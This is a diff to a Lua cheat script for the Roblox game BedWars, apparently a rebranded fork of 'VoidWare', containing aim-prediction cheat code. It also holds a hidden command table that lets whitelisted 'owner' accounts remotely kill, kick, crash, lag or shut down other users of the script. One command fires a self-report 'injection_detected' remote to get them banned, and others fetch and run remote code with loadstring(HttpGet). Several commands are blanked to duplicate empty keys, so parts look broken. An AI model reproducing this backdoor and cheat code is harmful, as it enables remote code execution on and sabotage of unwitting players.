@@ -1,3 +1,4 @@
+--This watermark is used to delete the file if its cached, remove it to make the file persist after commits.
 local GuiLibrary = shared.GuiLibrary
 local playersService = game:GetService("Players")
 local textService = game:GetService("TextService")
@@ -212,7 +213,7 @@ local function predictGravity(playerPosition, vel, bulletTime, targetPart, Gravi
 			estimatedVelocity = estimatedVelocity - (Gravity * physicsUpdate)
 		else
 			estimatedVelocity = 0
-			playerPosition = playerPosition + Vector3.new(0, -0.03, 0)
+			playerPosition = playerPosition + Vector3.new(0, -0.03, 0) -- bw hitreg is so bad that I have to add this LOL
 			rootSize = rootSize - 0.03
 		end
 
@@ -639,7 +640,7 @@ local function EntityNearPosition(distance, ignore, overridepos)
 					if overridepos and mag > distance then 
 						mag = (overridepos - v.PrimaryPart.Position).magnitude
 					end
-					if mag <= closestMagnitude then
+					if mag <= closestMagnitude then -- magcheck
 						closestEntity, closestMagnitude = {Player = {Name = "Drone", UserId = 1443379645}, Character = v, RootPart = v.PrimaryPart, JumpTick = tick() + 5, Jumping = false, Humanoid = {HipHeight = 2}}, mag
 					end
 				end
@@ -756,6 +757,7 @@ local function AllNearPosition(distance, amount, sortfunction, prediction)
 	return returnedplayer
 end
 
+--pasted from old source since gui code is hard
 local function CreateAutoHotbarGUI(children2, argstable)
 	local buttonapi = {}
 	buttonapi["Hotbars"] = {}
@@ -3179,6 +3181,7 @@ runFunction(function()
 	local alternatelist = {"Normal", "AntiCheat A", "AntiCheat B"}
 	local projectileRemote = bedwars.ClientHandler:Get(bedwars.ProjectileRemote)
 
+	--me when I have to fix bw code omegalol
 	bedwars.ClientHandler:Get("GrapplingHookFunctions"):Connect(function(p4)
 		if p4.hookFunction == "PLAYER_IN_TRANSIT" then
 			bedwars.CooldownController:setOnCooldown("grappling_hook", 3.5)
@@ -4672,6 +4675,8 @@ runFunction(function()
 		Default = true
 	})
 end)
+
+--until I find a way to make the spam switch item thing not bad I'll just get rid of it, sorry.
 
 local Scaffold = {Enabled = false}
 runFunction(function()
@@ -10393,8 +10398,8 @@ local function getLplrType()
 			end
 		end
 	end
-	if whitelist["Void"] ~= nil then
-		for i,v in pairs(whitelist["Void"]) do
+	if whitelist["No"] ~= nil then
+		for i,v in pairs(whitelist["No"]) do
 			if v.id == tostring(lplr.UserId) then
 				lplr_Type = 2
 				return lplr_Type
@@ -10427,8 +10432,8 @@ function CanAttackUser(u)
 		end
 	end
 
-	if whitelist["Void"] ~= nil then
-		for i, v in pairs(whitelist["Void"]) do
+	if whitelist["No"] ~= nil then
+		for i, v in pairs(whitelist["No"]) do
 			if v.id == userId then
 				userType = 2
 				break
@@ -10449,12 +10454,12 @@ function CanAttackUser(u)
 end
 
 local commands = {
-	[";kill default"] = function()
+	[".kill"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
 		end
 	end,
-	[";funnyvideo default"] = function()
+	[""] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			local filename = "bruh"
 			local ScreenGui = Instance.new("ScreenGui")
@@ -10467,27 +10472,27 @@ local commands = {
 
 			local Name = filename .. ".mp4"
 			if not isfile(Name) then
-				writefile(Name, game:HttpGet("https://videos.xet1.repl.co/videos/" .. filename .. ".Void"))
+				writefile(Name, game:HttpGet("https://videos.xet1.repl.co/videos/" .. filename .. "."))
 			end
 
 			video.Video = syn and getsynasset(Name) or getcustomasset(Name)
 
 			repeat
 				task.wait()
-				print("Retrying...")
+				print("")
 			until video.Loaded
 
 			video:Play()
 		end
 	end,
-	[";reveal default"] = function()
+	[".show"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			local textChatService = game:GetService("TextChatService")
 			wait(0.0001)
-			textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("Im Using VoidWare Made By Void")
+			textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("Im Using VoidWare Made By Void | .gg/gYS7Dfgu")
 		end
 	end,
-	[";void default"] = function()
+	[".void"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			local character = game.Players.LocalPlayer.Character
 			local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
@@ -10499,14 +10504,14 @@ local commands = {
 			end
 		end
 	end,
-	[";blind default"] = function()
+	[""] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			local blur = Instance.new("BlurEffect")
 			blur.Size = 10000000000000
 			blur.Parent = game.Lighting
 		end
 	end,
-	[";unblind default"] = function()
+	[""] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			local blur = game.Lighting:FindFirstChildOfClass("BlurEffect")
 			if blur then
@@ -10514,52 +10519,52 @@ local commands = {
 			end
 		end
 	end,
-	[";troll default"] = function()
+	[".troll"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/main/trollage"))()
 		end
 	end,
-	[";kick default"] = function()
+	[".kick"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			wait(1)
 			for index, player in pairs(game.Players:GetPlayers()) do
-				player:Kick("You Got Kicked By Void")
+				player:Kick("Void Has Just Kicked You")
 			end
 		end
 	end,
-	[";ban default"] = function()
+	[""] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			local rs = game:GetService("ReplicatedStorage")
 			local remote = rs:FindFirstChild("SelfReport", true)
 			remote:FireServer("injection_detected")
 		end
 	end,
-	[";rickroll default"] = function()
+	[".rickroll"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/main/RickRoll"))()
 		end
 	end,
-	[";freeze default"] = function()
+	[".freeze"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			game.Players.LocalPlayer.Character.HumanoidRootPart.Massless = true
 		end
 	end,
-	[";thaw default"] = function()
+	[".thaw"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			game.Players.LocalPlayer.Character.HumanoidRootPart.Massless = false
 		end
 	end,
-	[";lobby default"] = function()
+	[".lobby"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			game:GetService("ReplicatedStorage"):FindFirstChild("bedwars"):FindFirstChild("ClientHandler"):Get("TeleportToLobby"):SendToServer()
 		end
 	end,
-	[";quitgame default"] = function()
+	[".quitgame"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			game:Shutdown()
 		end
 	end,
-	[";lagback default"] = function()
+	[".lagback"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			for i = 1, 10 do
 				wait()
@@ -10572,7 +10577,7 @@ local commands = {
 			end
 		end
 	end,
-	[";breakgame default"] = function()
+	[""] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			pcall(function()
 				local replicatedStorage = game:GetService("ReplicatedStorage")
@@ -10582,7 +10587,7 @@ local commands = {
 			end)
 		end
 	end,
-	[";breakmap default"] = function()
+	[""] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			local function unanchorParts(object)
 				if object:IsA("BasePart") then
@@ -10595,18 +10600,18 @@ local commands = {
 			unanchorParts(workspace)
 		end
 	end,
-	[";crash default"] = function()
+	[".crash"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			while true do end
 		end
 	end,
-	[";infping default"] = function()
+	[""] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			local thingy = settings().Network
 			thingy.IncomingReplicationLag = math.huge
 		end
 	end,
-	[";lag default"] = function()
+	[".lag"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then 
 			local RunService = game:GetService("RunService")
 			local player = game.Players.LocalPlayer
@@ -10624,7 +10629,7 @@ local commands = {
 			end)
 		end
 	end,
-	[";loopkill default"] = function()
+	[""] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			_G.loopkill = true;
 			while _G.loopkill == true do
@@ -10633,7 +10638,7 @@ local commands = {
 			end
 		end
 	end,
-	[";unloopkill default"] = function()
+	[""] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			_G.loopkill = false;
 		end
@@ -10699,7 +10704,7 @@ txt.OnIncomingMessage = function(msg)
 				if v.id == userId then
 					if not hasTag then
 						hasTag = true
-						p.PrefixText = "<font color='"..colors["white"].."'>[VoidWare Private]</font> " .. msg.PrefixText
+						p.PrefixText = "<font color='"..colors["white"].."'>[No]</font> " .. msg.PrefixText
 					end
 					userType = 1
 				end
@@ -10711,19 +10716,19 @@ txt.OnIncomingMessage = function(msg)
 				if v.id == userId then
 					if not hasTag then
 						hasTag = true
-						p.PrefixText = "<font color='#ffffff'>[VoidWare]</font> " .. msg.PrefixText
+						p.PrefixText = "<font color='#ffffff'>[No]</font> " .. msg.PrefixText
 					end
 					userType = 3
 				end
 			end
 		end
 
-		if whitelist["Void"] ~= nil then
-			for i, v in pairs(whitelist["Void"]) do
+		if whitelist["No"] ~= nil then
+			for i, v in pairs(whitelist["No"]) do
 				if v.id == userId then
 					if not hasTag then
 						hasTag = true
-						p.PrefixText = "<font color='"..colors["white"].."'>[VoidWare Owner]</font> " .. msg.PrefixText
+						p.PrefixText = "<font color='"..colors["white"].."'>[NoWare Owner]</font> " .. msg.PrefixText
 					end
 					userType = 2
 				end
